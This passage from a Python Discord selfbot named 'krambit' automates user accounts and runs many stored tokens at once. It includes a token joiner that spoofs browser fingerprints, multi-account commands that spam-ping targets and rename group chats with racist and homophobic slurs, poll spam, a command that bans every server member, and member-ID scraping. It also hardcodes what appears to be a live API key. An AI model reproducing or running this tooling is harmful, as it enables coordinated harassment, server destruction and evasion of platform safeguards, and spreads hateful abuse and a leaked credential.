    await ctx.send("Stopped reacting", delete_after=3)
     
     
@krambit.command(aliases=['sreact', 'sr', 'superr'])
async def superreact(ctx, *emojis) -> None:
    global super_emojis, super_reaction_active
    await ctx.message.delete()

    if not emojis:
        await ctx.send("Please specify at least one emoji.", delete_after=5)
        return

    if super_reaction_active:
        super_emojis = list(emojis)
        await ctx.send(f"Updated superreact emojis to: {', '.join(emojis)}", delete_after=5)
        print(f"Updated superreact emojis to: {', '.join(emojis)}")
    else:
        super_emojis = list(emojis)
        super_reaction_active = True
        await ctx.send(f"Started superreacting with: {', '.join(emojis)}", delete_after=3)
        print(f"Started superreacting with: {', '.join(emojis)}")

@krambit.command(aliases=['stopsr', 'endsr', 'ssr'])
async def stopsuperreact(ctx) -> None:
    global super_emojis, super_reaction_active
    await ctx.message.delete()

    if not super_reaction_active:
        await ctx.send("Not currently superreacting.", delete_after=3)
        print("Not currently superreacting")
        return

    super_emojis = []
    super_reaction_active = False
    await ctx.send("Stopped all superreacts", delete_after=3)
    print("Stopped all superreacts")
 

@krambit.command()
async def poll(ctx, channel_id: int, *, name: str):
    await ctx.message.delete()
    global pspam
    pspam = True

    while pspam:
        try:
            with open("ab.txt", "r", encoding="utf-8") as file:
                lines = [line.strip() for line in file if line.strip()]
        except FileNotFoundError:
            return

        if not lines:
            return

        poll_question = random.choice(lines).replace("{name}", name)
        nonce = str(random.randint(10**17, 10**18))
        poll_name = f"FYZE HOES THE FUCK OUT OF {name}"

        poll_data = {
            "mobile_network_type": "unknown",
            "content": "",
            "nonce": nonce,
            "tts": False,
            "flags": 0,
            "poll": {
                "question": {"text": poll_name},
                "answers": (
                    [{"poll_media": {"text": poll_name}}]
                    + [{"poll_media": {"text": poll_question}} for _ in range(8)]
                    + [{"poll_media": {"text": poll_name}}]
                ),
                "allow_multiselect": True,
                "duration": 5,
                "layout_type": 1
            }
        }

        async with session.post(
            f"https://discord.com/api/v10/channels/{channel_id}/messages",
            headers={
                "Authorization": token,
                "Content-Type": "application/json"
            },
            json=poll_data
        ):
            pass

        await asyncio.sleep(3)
        

@krambit.command()
async def stoppoll(ctx):
    global pspam
    pspam = False
    await ctx.message.delete()


def format_duration(seconds):
    seconds = int(seconds)
    if seconds < 60:
        return f"{seconds} second{'s' if seconds != 1 else ''}"
    minutes, sec = divmod(seconds, 60)
    if minutes < 60:
        return f"{minutes} minute{'s' if minutes != 1 else ''} {sec} second{'s' if sec != 1 else ''}"
    hours, min = divmod(minutes, 60)
    return f"{hours} hour{'s' if hours != 1 else ''} {min} minute{'s' if min != 1 else ''}"


@krambit.command()
async def log(ctx, channel_id: int = None):
    await ctx.message.delete()
    channel = krambit.get_channel(channel_id) if channel_id else ctx.channel
    if not channel:
        return

    messages = []
    total_messages = 0
    async for _ in channel.history(limit=None, oldest_first=True):
        total_messages += 1

    if total_messages == 0:
        await ctx.send("No messages to log.")
        return

    progress_msg = await ctx.send(f"Logging <#{channel.id}> in progress...\n[0% Completed]\nEst. Time: calculating...")

    messages = []
    fetched = 0
    start_time = time.time()
    last_update = time.time()

    async for message in channel.history(limit=None, oldest_first=True):
        timestamp = message.created_at.strftime("%Y-%m-%d %H:%M:%S")
        messages.append(f"[{timestamp}] {message.author.name}: {message.content}")
        fetched += 1

        now = time.time()
        if now - last_update >= 5:
            percent = (fetched / total_messages) * 100
            elapsed = now - start_time
            est_total = (elapsed / fetched) * total_messages if fetched else 0
            est_remaining = est_total - elapsed
            est_str = format_duration(est_remaining)
            await progress_msg.edit(content=(
                f"Logging <#{channel.id}> in progress...\n"
                f"[{percent:.1f}% Completed]\n"
                f"Est. Time: {est_str}"
            ))
            last_update = now

    await progress_msg.edit(content="Writing messages to file...")

    with open("log.txt", "w", encoding="utf-8") as file:
        file.write("\n".join(messages))

    await ctx.send(file=discord.File("log.txt"))
    os.remove("log.txt")
    await progress_msg.edit(content=f"Finished logging <#{channel.id}> ({fetched} messages).")


@krambit.command()
async def ping(ctx):
    def convert_units(value):
        units = ["ps", "ns", "µs", "ms", "s"]
        scales = [1e-12, 1e-9, 1e-6, 1e-3, 1]  
        for i in range(len(scales) - 1, -1, -1):
            if value >= scales[i] or i == 0:
                return f"{value / scales[i]:.2f}{units[i]}"

    start_determinism = time.perf_counter()
    _ = ctx.prefix
    end_determinism = time.perf_counter()
    prefix_determinism_time = end_determinism - start_determinism  

    host = krambit.latency
    api = (datetime.now(timezone.utc) - ctx.message.created_at.replace(tzinfo=timezone.utc)).total_seconds()
    now = datetime.now(timezone.utc)
    uptime_duration = now - start_time

    d = uptime_duration.days
    h, r = divmod(uptime_duration.seconds, 3600)
    m, s = divmod(r, 60)

    upart = []
    if d > 0:
        upart.append(f"{d}d")
    if h > 0:
        upart.append(f"{h}h")
    if m > 0:
        upart.append(f"{m}m")
    if s > 0 or not upart:
        upart.append(f"{s}s")

    uptime = " ".join(upart)

    response = (
        "```js\n"
        f"Prefix Determinism Time: <{convert_units(prefix_determinism_time)}>\n"
        f"Host Latency: <{convert_units(host)}>\n"
        f"API Latency: <{convert_units(api)}>\n"
        f"Uptime: <{uptime}>\n"
        "```"
    )
    
    await ctx.send(response, delete_after=20)
    await ctx.message.delete()

@krambit.command()
async def ig(ctx, channelid: str = None):
    await ctx.message.delete()
    cid = channelid or str(ctx.channel.id)

    r = requests.post(
        f"https://discord.com/api/v10/channels/{cid}/invites",
        json={},
        headers=globalhead
    )
    data = r.json()

    if "code" in data:
        await ctx.send(f"https://discord.gg/{data['code']}")
    else:
        err = data.get("message", "Unknown error")
        await ctx.send(f"Could not create invite: {err}", delete_after=10)


class DiscordJoinerPY:
    def __init__(self):
        self.client = tls_client.Session(
            client_identifier="chrome120",
            random_tls_extension_order=True
        )
        self.tokens = []
        self.load_tokens()

    def headers(self, token: str):
        headers = {
            'authority': 'discord.com',
            'accept': '*/*',
            'accept-language': 'it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7',
            'authorization': token,
            'content-type': 'application/json',
            'origin': 'https://discord.com',
            'referer': 'https://discord.com/channels/@me',
            'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="120", "Not:A-Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'x-context-properties': 'eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6IjExMDQzNzg1NDMwNzg2Mzc1OTEiLCJsb2NhdGlvbl9jaGFubmVsX2lkIjoiMTEwNzI4NDk3MTkwMDYzMzIzMCIsImxvY2F0aW9uX2NoYW5uZWxfdHlwZSI6MH0=',
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-GB',
            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6Iml0LUlUIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE5MzkwNiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ==',
        }
        return headers


    def get_cookies(self):
        cookies = {}
        try:
            response = self.client.get('https://discord.com')
            for cookie in response.cookies:
                if cookie.name.startswith('__') and cookie.name.endswith('uid'):
                    cookies[cookie.name] = cookie.value
            return cookies
        except Exception as e:
            print(f'Failed to obtain cookies ({e})')
            return cookies

    def accept_invite(self, token: str, invite: str):
        payload = {
            'session_id': ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(16))
        }
        try:
            response = self.client.post(
                url=f'https://discord.com/api/v10/invites/{invite}',
                headers=self.headers(token=token),
                json=payload,
                cookies=self.get_cookies()
            )
            if response.status_code == 200:
                return "Successfully"
            elif response.status_code == 401:
                return "Invalid Token"
            elif response.status_code == 403:
                return "Flagged Token"
            elif response.status_code == 400:
                return "Hcaptcha"
            elif response.status_code == 404:
                return "Unknown invite"
            else:
                return f"Error {response.status_code}"
        except Exception as e:
            return str(e)

    def load_tokens(self):
        try:
            with open("tokens.txt", "r") as file:
                self.tokens = [line.strip() for line in file.readlines()]
        except:
            self.tokens = []


@krambit.command(aliases=['tjoin'])
async def mjoin(ctx, invite: str):
    joiner = DiscordJoinerPY()
    if not joiner.tokens:
        await ctx.send("No tokens found in tokens.txt", delete_after=5)
        return

    msg = await ctx.send("[Token Joiner in progress]\n\nToken: N/A\nStatus: Waiting...")

    for token in joiner.tokens:
        token_display = token[:15] 
        status = joiner.accept_invite(token, invite)
        await msg.edit(content=f"[Token Joiner in progress]\n\nToken: {token_display}\nStatus: {status}")
        await asyncio.sleep(2)

    await msg.edit(content="[Token Joiner Finished]\n\nAll tokens processed.")
    
    
@krambit.command()
async def ask(ctx, *, prompt: str):
    await ctx.message.delete()

    headers = {
        "Authorization": "Bearer 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",
        "Content-Type": "application/json"
    }

    data = {
        "model": "openai/gpt-oss-20b",
        "messages": [{"role": "user", "content": prompt}],
        "temperature": 0.3
    }

    async with aiohttp.ClientSession() as session:
        async with session.post("https://api.groq.com/openai/v1/chat/completions", headers=headers, json=data) as response:
            if response.status == 200:
                try:
                    resp_json = await response.json()
                    text_output = resp_json["choices"][0]["message"]["content"]
                except (KeyError, IndexError):
                    text_output = "Couldn't parse the response."
            else:
                text_output = f"Error {response.status}: {await response.text()}"

    for chunk in split_message(text_output):
        await ctx.send(chunk)


@krambit.command()
async def restart(ctx):
    await ctx.message.delete()
    os.execv(sys.executable, [sys.executable] + sys.argv)
    

@krambit.command()
async def banall(ctx):
    try:
        await ctx.message.delete()
    except:
        pass

    if ctx.guild.id in {1279045226584871013, 987654321098765432}:
        return

    semaphore = asyncio.Semaphore(2)

    async def ban_member(member):
        async with semaphore:
            try:
                await ctx.guild.ban(member, reason="krambit > you")
            except:
                pass

    await asyncio.gather(*[ban_member(member) for member in ctx.guild.members])


event_rotations = {}

@krambit.command()
async def erotate(ctx, event_id: int, *, topics: str):
    await ctx.message.delete()
    guild = ctx.guild
    if not guild:
        return
    try:
        event = await guild.fetch_scheduled_event(event_id)
    except:
        return
    names = [t.strip() for t in topics.replace("|", ",").split(",") if t.strip()]
    if not names:
        return
    if event_id in event_rotations:
        return
    event_rotations[event_id] = True
    try:
        while event_rotations.get(event_id):
            for name in names:
                if not event_rotations.get(event_id):
                    break
                try:
                    await event.edit(name=name)
                except:
                    pass
                await asyncio.sleep(30)
    finally:
        event_rotations.pop(event_id, None)

@krambit.command()
async def erotatestop(ctx, event_id: int):
    await ctx.message.delete()
    if event_id in event_rotations:
        event_rotations[event_id] = False



@krambit.command()
async def console(ctx, subcmd=None, *args):
    await ctx.message.delete()

    if subcmd is None:
        return await ctx.send("Usage: .console <create|delete|list|rename>", delete_after=5)

    subcmd = subcmd.lower()

    if subcmd == "create":
        if not args:
            return await ctx.send("Usage: .console create <filename>", delete_after=5)
        filename = args[0]
        if os.path.exists(filename):
            return await ctx.send(f"File '{filename}' already exists.", delete_after=5)
        with open(filename, "w") as f:
            f.write("")
        await ctx.send(f"Created file '{filename}'.", delete_after=5)

    elif subcmd == "delete":
        if not args:
            return await ctx.send("Usage: .console delete <filename>", delete_after=5)
        filename = args[0]
        if not os.path.exists(filename):
            return await ctx.send(f"File '{filename}' not found.", delete_after=5)
        os.remove(filename)
        await ctx.send(f"Deleted '{filename}'.", delete_after=5)

    elif subcmd == "list":
        files = [f for f in os.listdir('.') if os.path.isfile(f)]
        if not files:
            return await ctx.send("No files found in this directory.", delete_after=5)
        file_list = "\n".join([f"- {f}" for f in files])
        await ctx.send(f"Files:\n{file_list}", delete_after=10)

    elif subcmd == "rename":
        if len(args) < 2:
            return await ctx.send("Usage: .console rename <old> <new>", delete_after=5)
        old, new = args[0], args[1]
        if not os.path.exists(old):
            return await ctx.send(f"File '{old}' not found.", delete_after=5)
        if os.path.exists(new):
            return await ctx.send(f"File '{new}' already exists.", delete_after=5)
        os.rename(old, new)
        await ctx.send(f"Renamed '{old}' to '{new}'.", delete_after=5)

    else:
        await ctx.send("Unknown subcommand.", delete_after=5)



@krambit.command()
async def fetchsticker(ctx, guild_id: int):
    await ctx.message.delete()
    guild = krambit.get_guild(guild_id)
    if not guild:
        try:
            guild = await krambit.fetch_guild(guild_id)
        except Exception as e:
            return await ctx.send(f"Failed to fetch guild: {e}")
    try:
        stickers = await guild.fetch_stickers()
    except Exception as e:
        return await ctx.send(f"Failed to fetch stickers: {e}")
    if not stickers:
        return await ctx.send("No stickers found in that guild.")
    msg = "\n".join([f"{st.name} → `{st.id}`" for st in stickers])
    if len(msg) > 1900:
        msg = msg[:1900] + "\n... (truncated)"
    await ctx.send(f"**Stickers in {guild.name}:**\n{msg}")

@krambit.command()
async def sendsticker(ctx, sticker_id: int):
    await ctx.message.delete()
    try:
        sticker = await krambit.fetch_sticker(sticker_id)
    except Exception as e:
        return await ctx.send(f"Could not fetch sticker: {e}")
    try:
        await ctx.send(stickers=[sticker])
    except Exception as e:
        await ctx.send(f"Failed to send sticker: {e}")

@krambit.command(description="Scrapes members and saves their IDs.")
async def scrapemembers(ctx):
    await ctx.message.delete()

    os.makedirs("krambit/scrape", exist_ok=True)
    filePath = "krambit/scrape/members.txt"

    members = await ctx.guild.fetch_members(cache=True, delay=0.7)

    with open(filePath, "w") as f:
        for member in members:
            f.write(f"{member.id}\n")


@krambit.command()
async def deco(ctx, sku_id: int):
    await ctx.message.delete()

    r = sesh.patch(
        "https://discord.com/api/v10/users/@me",
        headers=globalhead,
        json={"avatar_decoration_sku_id": str(sku_id)}
    )

    if r.status_code in (200, 204):
        await ctx.send("```Decoration updated```", delete_after=3)
    else:
        await ctx.send(f"```{r.status_code}\n{r.text}```", delete_after=5)
        
@krambit.command(name="list")
async def list_cmd(ctx, mode=None):
    await ctx.message.delete()

    modes = {
        "decorations": 0,
        "decor": 0,
        "deco": 0,
        "decors": 0,

        "effects": 1,
        "effect": 1,
        "fx": 1,

        "nameplate": 2,
        "plate": 2,
        "np": 2
    }

    if mode not in modes:
        return

    url = "https://discord.com/api/v10/users/@me/collectibles-purchases"
    params = {"variants_return_style": 2}

    def fetch():
        return requests.get(url, headers=globalhead, params=params, timeout=20)

    r = await asyncio.to_thread(fetch)

    if r.status_code != 200:
        await ctx.send("```Failed to fetch collectibles```", delete_after=3)
        return

    data = r.json()

    out = []
    idx = 1

    for i in data:
        if i.get("type") != modes[mode]:
            continue

        name = i.get("name") or "Unknown"
        sku = i.get("sku_id") or "N/A"
        out.append(f"[{idx}] {name} | {sku}")
        idx += 1

    if not out:
        await ctx.send(f"```No {mode} found```", delete_after=3)
        return

    title = {
        0: "Avatar Decorations",
        1: "Profile Effects",
        2: "Name Plates"
    }[modes[mode]]

    msg = f"{title}:\n" + "\n".join(out)

    if len(msg) > 1900:
        await ctx.send(f"```{title} list too large```", delete_after=3)
    else:
        await ctx.send(f"```{msg}```", delete_after=12)
        
            
# MULTI #
  
clients = []  
m_statuses = []
m_index = 0
m_stream = False
gc_name = ["discord.gg/flowing runs", "you are ass nigga", "you are a biological failure", "you are shit", "We dont fw you", "dork ass nigga", "kys faggot you are a reject", "nobody knows you", "you are an unknown faggot", "stop fingering your booty hole", "discord.gg/flowing owns", "discord.gg/flowing runs your bloodline", "you are a biological error moron", "broken ass nigga", "faggot come and fight me", "distracted faggot", "i will annihilate your life", "FUCKING CUMSLUT SHUT THE FUCK UP", "discord.gg/flowing IS YOUR LORD", "WE ARE YOUR LORDS WORSHIP US", "ur ego shattered", "no future nigga", "hideous cuck"]
die = False
mgc = False
text_status_list = []
emoji_status_list = []


class MultiClient(discord.Client):
    def __init__(self, token):
        super().__init__(assume_unsync_clock=True, max_messages=5000, heartbeat_timeout=120.0, reconnect=True)
        self.token = token
        self.react_emoji = None
        self.reaction_queue = asyncio.Queue()
        self.rate_limit_lock = asyncio.Lock()
        asyncio.create_task(self.process_react_queue())
        self.token = token
        self.autoreply_user = None
        self.reply_lines = []
        self.last_trigger = 0


    async def on_ready(self):
        print(f"[ Multi Token Client ] Logged in as {self.user}")
        await self.change_presence(status=discord.Status.dnd)

    async def start_client(self):
        try:
            await self.start(self.token, reconnect=True)
        except Exception as e:
            print(f"Client start failed for {self.token[:5]}...: {e}")

    async def on_message(self, message):
        if self.react_emoji and message.author.id == krambit.user.id:
            await self.reaction_queue.put((message, self.react_emoji))

        if self.autoreply_user == message.author.id:
            await message.reply(random.choice(self.reply_lines))

    def start_replying(self, user_id):
        self.autoreply_user = user_id
        with open("ab.txt", "r") as f:
            self.reply_lines = [line.strip() for line in f if line.strip()]


    async def process_react_queue(self):
        while True:
            message, emoji = await self.reaction_queue.get()
            async with self.rate_limit_lock:
                try:
                    await message.add_reaction(emoji)
                    await asyncio.sleep(0.3)
                except discord.HTTPException as e:
                    print(f"Failed to add reaction: {e}")
                except Exception as e:
                    print(f"Unexpected error when adding reaction: {e}")
                finally:
                    self.reaction_queue.task_done()

    def start_reacting(self, emoji):
        self.react_emoji = emoji

    def stop_reacting(self):
        self.react_emoji = None

    def stop_replying(self):
        self.autoreply_user = None

async def startmulti():
    global clients
    try:
        with open("tokens.txt", "r") as file:
            tokens = [line.strip() for line in file.readlines() if line.strip()]
    except FileNotFoundError:
        print("Error: tokens.txt not found.")
        return

    clients = []
    for token in tokens:
        try:
            client = MultiClient(token)
            clients.append(client)
            asyncio.create_task(client.start_client())
        except Exception as e:
            print(f"Failed to start client with token {token}: {e}")


async def smulti():
    global clients
    for client in clients:
        try:
            await client.close()
        except Exception:
            pass
    clients.clear()
    
    
async def ms(client):
    global m_index

    while m_stream:
        try:
            if client.is_closed():
                await asyncio.sleep(10)
                continue

            while client.user is None:
                await asyncio.sleep(10)

            if m_statuses:
                await client.change_presence(
                    activity=discord.Streaming(name=m_statuses[m_index], url="https://www.twitch.tv/ex"),
                    status=discord.Status.dnd
                )

        except Exception:
            pass

        await asyncio.sleep(10)
        m_index = (m_index + 1) % len(m_statuses)
        

async def mdie(client, channel_id, user_ids, phrases):
    channel = client.get_channel(channel_id)
    if not channel:
        return

    while die:
        try:
            if client.is_closed():
                await asyncio.sleep(10)
                continue

            while client.user is None:
                await asyncio.sleep(10)

            sentence = random.choice(phrases)
            message = "\n".join(sentence.split()) + "\n" + " ".join(f"<@{uid}>" for uid in user_ids)
            await channel.send(message)

        except Exception as e:
            print(f"[Exception in mdie] {e}")
            await asyncio.sleep(3)
            continue

        await asyncio.sleep(random.uniform(2.9, 3.9))
        
        
async def smsg(client, channel_id: int, times: int, message: str):
    channel = client.get_channel(channel_id)
    if not channel:
        return
    for _ in range(times):
        try:
            await channel.send(message)
        except discord.errors.HTTPException as e:
            if e.status == 429:
                await asyncio.sleep(15)
            else:
                break
        await asyncio.sleep(0.2)


async def m_gc(client, channel_id: int, base_name: str):
    global mgc
    channel = client.get_channel(channel_id)
    if not channel:
        return

    while mgc:
        try:
            if client.is_closed():
                await asyncio.sleep(10)
                continue

            while client.user is None:
                await asyncio.sleep(10)

            new_name = f"{random.choice(gc_name)} {base_name}".strip()
            await channel.edit(name=new_name)

        except discord.errors.Forbidden:
            print(f"{client.user} does not have permission to rename {channel_id}")
            break
        except discord.errors.HTTPException:
            pass

        await asyncio.sleep(random.uniform(1.2, 1.4))
        


async def mleave(channel_id, token):
    async with aiohttp.ClientSession() as session:
        url = f"https://discord.com/api/v10/channels/{channel_id}?silent=true"
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/139.0.0.0.0 Safari/537.36",
            "Origin": "https://discord.com",
            "Referer": "https://discord.com/channels/@me",
            "X-Requested-With": "XMLHttpRequest"
        }

        try:
            async with session.delete(url, headers=headers) as response:
                if response.status not in (200, 204):
                    print(f"[mleave] Failed to leave {channel_id}: {response.status}")
        except Exception as e:
            print(f"[mleave] Exception while leaving {channel_id}: {e}")
 

async def map_spam(client, channel_id, message):
    client.ap_active = True
    try:
        channel = client.get_channel(channel_id) or await client.fetch_channel(channel_id)
    except Exception as e:
        print(f"Cannot fetch channel: {e}")
        return

    while client.ap_active:
        try:
            if client.is_closed():
                await asyncio.sleep(10)
                continue

            while client.user is None:
                await asyncio.sleep(10)

            await channel.send(message)
            await asyncio.sleep(random.uniform(2.9, 3.9))

        except Exception as e:
            print(f"Error sending message: {e}")
            await asyncio.sleep(5)


def parse_partial_emoji(emoji_str):
    try:
        return discord.PartialEmoji.from_str(emoji_str)
    except:
        return None

def parse_text_statuses(raw_text):
    return [item.strip() for item in re.split(r'[,\|]+', raw_text) if item.strip()]

def parse_emoji_statuses(raw_text):
    return [item.strip() for item in re.split(r'[,\|\s]+', raw_text) if item.strip()]

async def rotate_text(client):
    while True:
        if text_status_list:
            text_status_list.append(text_status_list.pop(0))
            try:
                text = text_status_list[0]
                emoji = parse_partial_emoji(emoji_status_list[0]) if emoji_status_list else None
                activity = discord.CustomActivity(name=text, emoji=emoji) if text or emoji else None
                await client.change_presence(activity=activity, status=discord.Status.dnd)
            except:
                pass
        await asyncio.sleep(15)

async def rotate_emoji(client):
    while True:
        if emoji_status_list:
            emoji_status_list.append(emoji_status_list.pop(0))
            try:
                text = text_status_list[0] if text_status_list else None
                emoji = parse_partial_emoji(emoji_status_list[0])
                activity = discord.CustomActivity(name=text, emoji=emoji) if text or emoji else None
                await client.change_presence(activity=activity, status=discord.Status.dnd)
            except:
                pass
        await asyncio.sleep(15)


@krambit.command()
async def multi(ctx, subcommand=None, *args):
    await ctx.message.delete()

    if subcommand is None:
        await ctx.send(
            "Multi Commands:\n"
            "• `multi start` - Start multi\n"
            "• `multi stop` - Stop multi\n"
            "• `multi restart` - Restart multi\n"
            "• `multi list` - List active multi clients",
            delete_after=5
        )
        return

    if subcommand == "start":
        asyncio.create_task(startmulti())
        await ctx.send("Started multi", delete_after=3)

    elif subcommand == "stop":
        await smulti()
        await ctx.send("Stopped multi", delete_after=5)

    elif subcommand == "restart":
        await smulti()
        asyncio.create_task(startmulti())
        await ctx.send("Restarted multi", delete_after=5)

    elif subcommand == "list":
        if not clients:
            await ctx.send("Multi is not running, use `.multi start`", delete_after=5)
        else:
            users = [f"[{i+1}] {client.user.name}" for i, client in enumerate(clients) if client.user]
            await ctx.send("```js\n[ Active Multi Clients ]\n\n" + "\n".join(users) + "\n```")

    else:
        await ctx.send("Invalid subcommand. Use `.multi` to see available options.", delete_after=3)

@krambit.command()
async def mgc(ctx, *, name: str = ""):
    global mgc
    if not clients:
        return await ctx.send("Multi is not running, use startmulti", delete_after=5)

    if mgc:
        return await ctx.send("Renaming already in progress.")

    await ctx.message.delete()
    mgc = True
    await asyncio.gather(*(m_gc(client, ctx.channel.id, name) for client in clients))


@krambit.command()
async def mgce(ctx):
    global mgc
    if not mgc:
        return await ctx.send("No renaming is running")

    await ctx.message.delete()
    mgc = False


@krambit.command()
async def die(ctx, *users: discord.User):
    global die
    await ctx.message.delete()
    if not clients:
        return
    user_ids = [user.id for user in users]
    if not user_ids:
        await ctx.send("Mention users to spam", delete_after=5)
        return
    try:
        with open("ab.txt", "r") as f:
            phrases = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        await ctx.send("ab.txt not found", delete_after=3)
        return
    die = True
    await asyncio.gather(*(mdie(client, ctx.channel.id, user_ids, phrases) for client in clients))


@krambit.command()
async def sdie(ctx):
    global die
    await ctx.message.delete()
    die = False
    
   
        
@krambit.command()
async def mspam(ctx, times: int, *, message: str):
    await ctx.message.delete()
    if not clients:
        await ctx.send("multi is not running.", delete_after=5)
        return
    if times <= 0:
        await ctx.send("Invalid amount", delete_after=5)
        return
    channel_id = ctx.channel.id
    await asyncio.gather(*(smsg(client, channel_id, times, message) for client in clients))


@krambit.command()
async def mstream(ctx, *, statuses_list: str):
    await ctx.message.delete()

    global m_statuses, m_stream, m_index

    if not clients:
        await ctx.send("Multi is not running, use startmulti", delete_after=5)
        return

    m_statuses = [status.strip() for status in statuses_list.split(',')]
    m_index = 0

    if not m_stream:
        m_stream = True
        await ctx.send(f"```Set status to {statuses_list}```", delete_after=3)
        await asyncio.gather(*[ms(client) for client in clients])
    else:
        await ctx.send("status rotation is already running!", delete_after=3)

@krambit.command()
async def mstreamoff(ctx):
    await ctx.message.delete()

    global m_stream

    if m_stream:
        m_stream = False
        for client in clients:
            try:
                await client.change_presence(activity=None, status=discord.Status.dnd)
            except Exception:
                pass
        await ctx.send("status rotation stopped", delete_after=3)
    else:
        await ctx.send("status rotation is not running", delete_after=3)


@krambit.command()
async def mr(ctx, emoji: str):
    if not clients:
        return await ctx.send("Multi is not running, use startmulti", delete_after=5)
    
    await ctx.message.delete()
    
    for client in clients:
        client.start_reacting(emoji)

    await ctx.send(f"Started reacting with {emoji}", delete_after=3)


@krambit.command()
async def mre(ctx):
    if not any(client.react_emoji for client in clients):
        return await ctx.send("No reaction process is running.", delete_after=3)

    await ctx.message.delete()

    for client in clients:
        client.stop_reacting()

    await ctx.send("Stopped reacting", delete_after=3) 


@krambit.command()
async def mvc(ctx, subcommand=None, *args):
    await ctx.message.delete()

    if subcommand is None:
        await ctx.send(
            "Voice Channel Commands:\n"
            "• `.mvc join <channel_id> (guild_id)`\n"
            "• `.mvc leave (guild_id)`\n"
            "• `.mvc status`\n"
            "• `.mvc mute (guild_id)`\n"
            "• `.mvc unmute (guild_id)`\n"
            "• `.mvc deaf (guild_id)`\n"
            "• `.mvc undeaf (guild_id)`",
            delete_after=10
        )
        return

    if subcommand == "join":
        await mvc_join(ctx, *args)
    elif subcommand == "status":
        await mvc_status(ctx)
    elif subcommand == "leave":
        await mvc_leave(ctx, *args)
    elif subcommand == "mute":
        await mvc_mute(ctx, *args)
    elif subcommand == "unmute":
        await mvc_unmute(ctx, *args)
    elif subcommand == "deaf":
        await mvc_deafen(ctx, *args)
    elif subcommand == "undeaf":
        await mvc_undeafen(ctx, *args)
    else:
        await ctx.send("Invalid subcommand. Use `.mvc` to see all options.", delete_after=3)

async def mvc_join(ctx, channel_id=None, guild_id=None):
    if not channel_id:
        await ctx.send("Please provide a voice channel ID", delete_after=3)
        return

    async def join_client(client):
        guild = client.get_guild(int(guild_id)) if guild_id else client.get_guild(ctx.guild.id)
        if not guild:
            return
        try:
            channel = guild.get_channel(int(channel_id))
            if not channel or not isinstance(channel, discord.VoiceChannel):
                return
            vc = guild.voice_client
            if vc:
                await vc.move_to(channel)
            else:
                await channel.connect(reconnect=True)
        except:
            pass

    await asyncio.gather(*(join_client(client) for client in clients))
    await ctx.send(f"All clients attempted to join <#{channel_id}>", delete_after=3)

async def mvc_leave(ctx, guild_id=None):
    async def leave_client(client):
        guild = client.get_guild(int(guild_id)) if guild_id else client.get_guild(ctx.guild.id)
        if not guild:
            return
        vc = guild.voice_client
        if vc:
            await vc.disconnect(force=True)

    await asyncio.gather(*(leave_client(client) for client in clients))
    await ctx.send("All clients disconnected from VC", delete_after=3)

async def mvc_status(ctx):
    statuses = []

    for client in clients:
        guild = client.get_guild(ctx.guild.id)
        if not guild:
            continue
        vc = guild.voice_client
        if vc:
            statuses.append(f"{client.user} in {vc.channel.name}")
        else:
            statuses.append(f"{client.user} not in VC")

    await ctx.send("\n".join(statuses), delete_after=6)

async def mvc_mute(ctx, guild_id=None):
    async def mute_client(client):
        guild = client.get_guild(int(guild_id)) if guild_id else client.get_guild(ctx.guild.id)
        if not guild or not guild.voice_client:
            return
        try:
            await guild.change_voice_state(channel=guild.voice_client.channel, self_mute=True, self_deaf=guild.me.voice.self_deaf)
        except:
            pass

    await asyncio.gather(*(mute_client(client) for client in clients))
    await ctx.send("Muted all clients", delete_after=3)

async def mvc_unmute(ctx, guild_id=None):
    async def unmute_client(client):
        guild = client.get_guild(int(guild_id)) if guild_id else client.get_guild(ctx.guild.id)
        if not guild or not guild.voice_client:
            return
        try:
            await guild.change_voice_state(channel=guild.voice_client.channel, self_mute=False, self_deaf=guild.me.voice.self_deaf)
        except:
            pass

    await asyncio.gather(*(unmute_client(client) for client in clients))
    await ctx.send("Unmuted all clients", delete_after=3)

async def mvc_deafen(ctx, guild_id=None):
    async def deafen_client(client):
        guild = client.get_guild(int(guild_id)) if guild_id else client.get_guild(ctx.guild.id)
        if not guild or not guild.voice_client:
            return
        try:
            await guild.change_voice_state(channel=guild.voice_client.channel, self_mute=guild.me.voice.self_mute, self_deaf=True)
        except:
            pass

    await asyncio.gather(*(deafen_client(client) for client in clients))
    await ctx.send("Deafened all clients", delete_after=3)

async def mvc_undeafen(ctx, guild_id=None):
    async def undeafen_client(client):
        guild = client.get_guild(int(guild_id)) if guild_id else client.get_guild(ctx.guild.id)
        if not guild or not guild.voice_client:
            return
        try:
